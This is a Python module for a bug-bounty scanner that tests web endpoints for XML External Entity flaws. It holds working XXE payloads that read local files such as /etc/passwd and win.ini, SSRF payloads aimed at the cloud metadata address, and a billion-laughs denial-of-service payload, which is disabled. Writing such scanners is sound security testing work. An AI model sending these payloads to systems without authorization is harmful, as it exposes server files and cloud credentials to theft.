"""XXE (XML External Entity) scanner for BugBountyCrawler."""

import asyncio
from typing import List, Dict, Any
import aiohttp
import re

from .base import BaseScanner, ScanResult
from ..models.finding import Finding, FindingSeverity, FindingType


class XXEScanner(BaseScanner):
    """Scanner for XML External Entity (XXE) vulnerabilities."""
    
    def __init__(self, settings, rate_limiter=None):
        """Initialize XXE scanner."""
        super().__init__(settings, rate_limiter)
        self.name = "XXEScanner"
        
        # XXE payloads for different scenarios
        self.file_disclosure_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root><data>&xxe;</data></root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root><data>&xxe;</data></root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',
        ]
        
        # SSRF via XXE payloads
        self.ssrf_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]>
<root><data>&xxe;</data></root>''',
        ]
        
        # Billion laughs attack (DoS)
        self.dos_payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',
        ]
        
        # XXE indicators in responses
        self.xxe_indicators = [
            r'root:x:0:0:',  # /etc/passwd
            r'daemon:x:1:1:',
            r'127\.0\.0\.1\s+localhost',  # /etc/hosts
            r'::1\s+localhost',
            r'\[fonts\]',  # win.ini
            r'\[extensions\]',
            r'for 16-bit app support',
            r'Volume in drive',  # Windows
            r'ami-id',  # AWS metadata
            r'instance-id',
            r'security-credentials',
        ]
        
        # Common XML endpoints
        self.xml_endpoints = [
            '/api/xml', '/xml', '/soap', '/rest', '/api/soap',
            '/ws', '/webservice', '/service', '/api'
        ]
    
    async def scan_url(self, url: str) -> ScanResult:
        """Scan URL for XXE vulnerabilities."""
        findings = []
        errors = []
        response_time = 0.0
        status_code = 0
        headers = {}
        content_length = 0
        
        try:
            # Make baseline request
            response = await self.make_request(url)
            response_time = response.headers.get("X-Response-Time", 0.0)
            status_code = response.status
            headers = dict(response.headers)
            content_length = int(response.headers.get("Content-Length", 0))
            
            # Check if endpoint accepts XML
            if not self._is_xml_endpoint(url, headers):
                return ScanResult(
                    url=url,
                    findings=findings,
                    errors=errors,
                    response_time=response_time,
                    status_code=status_code,
                    headers=headers,
                    content_length=content_length
                )
            
            # Test file disclosure XXE
            file_findings = await self._test_file_disclosure_xxe(url)
            findings.extend(file_findings)
            
            # Test SSRF via XXE
            ssrf_findings = await self._test_ssrf_xxe(url)
            findings.extend(ssrf_findings)
            
            # Test DoS via XXE (carefully)
            # dos_findings = await self._test_dos_xxe(url)
            # findings.extend(dos_findings)
        
        except Exception as e:
            errors.append(str(e))
        
        return ScanResult(
            url=url,
            findings=findings,
            errors=errors,
            response_time=response_time,
            status_code=status_code,
            headers=headers,
            content_length=content_length
        )
    
    def _is_xml_endpoint(self, url: str, headers: Dict[str, str]) -> bool:
        """Check if endpoint accepts XML."""
        # Check URL path
        if any(endpoint in url.lower() for endpoint in self.xml_endpoints):
            return True
        
        # Check Content-Type header
        content_type = headers.get('Content-Type', '').lower()
        if 'xml' in content_type or 'soap' in content_type:
            return True
        
        return False
    
    async def _test_file_disclosure_xxe(self, url: str) -> List[Finding]:
        """Test for file disclosure via XXE."""
        findings = []
        
        for payload in self.file_disclosure_payloads:
            try:
                # Send XML payload
                response = await self.make_request(
                    url,
                    method='POST',
                    headers={'Content-Type': 'application/xml'},
                    data=payload
                )
                
                content = await response.text()
                
                # Check for XXE indicators
                for indicator in self.xxe_indicators:
                    if re.search(indicator, content, re.IGNORECASE):
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.XXE,
                            title="XML External Entity (XXE) - File Disclosure",
                            description="XXE vulnerability allows reading local files from the server",
                            severity=FindingSeverity.CRITICAL,
                            impact="XXE can lead to file disclosure, SSRF, denial of service, and potentially remote code execution",
                            likelihood="high",
                            risk_score=9.0,
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                "https://cwe.mitre.org/data/definitions/611.html"
                            ],
                            raw_data={
                                "payload": payload[:200],
                                "indicator": indicator,
                                "response_content": content[:500],
                                "xxe_type": "file_disclosure"
                            }
                        )
                        findings.append(finding)
                        return findings  # Stop after first finding
                
                await asyncio.sleep(0.2)
                
            except Exception:
                continue
        
        return findings
    
    async def _test_ssrf_xxe(self, url: str) -> List[Finding]:
        """Test for SSRF via XXE."""
        findings = []
        
        for payload in self.ssrf_payloads:
            try:
                response = await self.make_request(
                    url,
                    method='POST',
                    headers={'Content-Type': 'application/xml'},
                    data=payload
                )
                
                content = await response.text()
                
                # Check for metadata/internal service responses
                ssrf_indicators = ['ami-id', 'instance-id', 'security-credentials', 'localhost', 'internal']
                
                for indicator in ssrf_indicators:
                    if indicator in content.lower():
                        finding = self.create_finding(
                            url=url,
                            finding_type=FindingType.XXE,
                            title="XML External Entity (XXE) - SSRF",
                            description="XXE vulnerability allows Server-Side Request Forgery to internal services",
                            severity=FindingSeverity.CRITICAL,
                            impact="XXE-based SSRF can access internal services, cloud metadata, and bypass network restrictions",
                            likelihood="high",
                            risk_score=9.0,
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                "https://portswigger.net/web-security/xxe"
                            ],
                            raw_data={
                                "payload": payload[:200],
                                "indicator": indicator,
                                "response_content": content[:500],
                                "xxe_type": "ssrf"
                            }
                        )
                        findings.append(finding)
                        return findings
                
                await asyncio.sleep(0.2)
                
            except Exception:
                continue
        
        return findings
    
    async def _test_dos_xxe(self, url: str) -> List[Finding]:
        """Test for DoS via XXE (Billion Laughs attack)."""
        findings = []
        
        # NOTE: This is disabled by default as it can cause actual DoS
        # Uncomment only for authorized testing
        
        # for payload in self.dos_payloads:
        #     try:
        #         import time
        #         start_time = time.time()
        #         
        #         response = await self.make_request(
        #             url,
        #             method='POST',
        #             headers={'Content-Type': 'application/xml'},
        #             data=payload,
        #             timeout=10
        #         )
        #         
        #         end_time = time.time()
        #         elapsed = end_time - start_time
        #         
        #         if elapsed > 5:  # Took too long
        #             finding = self.create_finding(
        #                 url=url,
        #                 finding_type=FindingType.XXE,
        #                 title="XML External Entity (XXE) - Denial of Service",
        #                 description="XXE vulnerability susceptible to Billion Laughs DoS attack",
        #                 severity=FindingSeverity.HIGH,
        #                 impact="XXE-based DoS can cause service unavailability",
        #                 likelihood="medium",
        #                 risk_score=7.0,
        #                 references=[
        #                     "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
        #                 ],
        #                 raw_data={
        #                     "payload": payload[:200],
        #                     "response_time": elapsed,
        #                     "xxe_type": "dos"
        #                 }
        #             )
        #             findings.append(finding)
        #             return findings
        #         
        #         await asyncio.sleep(0.5)
        #         
        #     except asyncio.TimeoutError:
        #         # Timeout indicates potential DoS
        #         pass
        #     except Exception:
        #         continue
        
        return findings

